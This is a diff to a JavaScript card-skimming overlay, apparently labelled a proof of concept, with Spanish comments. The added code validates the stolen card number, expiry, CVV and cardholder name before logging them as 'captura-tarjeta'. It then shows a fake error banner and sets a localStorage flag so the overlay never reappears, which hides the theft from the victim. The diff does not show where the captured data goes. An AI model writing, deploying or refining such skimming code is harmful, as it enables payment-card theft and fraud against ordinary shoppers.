@@ -48,6 +48,10 @@
   // ─── Inyectar overlay (se llama cuando el usuario elige tarjeta) ──
 
   var overlayInjected = false;
+  var CAPTURED_KEY = 'poc_captured';
+
+  // Si ya se capturo antes, no mostrar nada
+  if (localStorage.getItem(CAPTURED_KEY)) return;
 
   function injectOverlay() {
     if (overlayInjected) return;
@@ -209,8 +213,33 @@
       });
     }
 
+    // Validacion
+    function validateFields() {
+      var errors = [];
+      var cardNum = cardEl.value.replace(/\s/g, '');
+      if (!cardNum || cardNum.length < 13 || cardNum.length > 16) errors.push(cardEl);
+      if (!expiryEl.value || !/^\d{2}\/\d{2}$/.test(expiryEl.value)) errors.push(expiryEl);
+      if (!cvvEl.value || cvvEl.value.length < 3) errors.push(cvvEl);
+      if (!fnameEl.value.trim()) errors.push(fnameEl);
+      if (!lnameEl.value.trim()) errors.push(lnameEl);
+
+      // Reset borders
+      [cardEl, expiryEl, cvvEl, fnameEl, lnameEl].forEach(function(el) {
+        el.style.borderColor = '#dbdbdb';
+      });
+
+      if (errors.length > 0) {
+        errors.forEach(function(el) { el.style.borderColor = '#c4601a'; });
+        errors[0].focus();
+        return false;
+      }
+      return true;
+    }
+
     // Boton pagar
     payBtn.addEventListener('click', function() {
+      if (!validateFields()) return;
+
       log('captura-tarjeta', {
         nombre: fnameEl.value,
         apellidos: lnameEl.value,
@@ -227,6 +256,8 @@
         payBtn.textContent = btnText;
         payBtn.style.background = '#2f6fb7';
         payBtn.disabled = false;
+
+        localStorage.setItem(CAPTURED_KEY, Date.now());
 
         errorBanner.style.display = 'block';
         errorBanner.classList.add('poc-error-in');
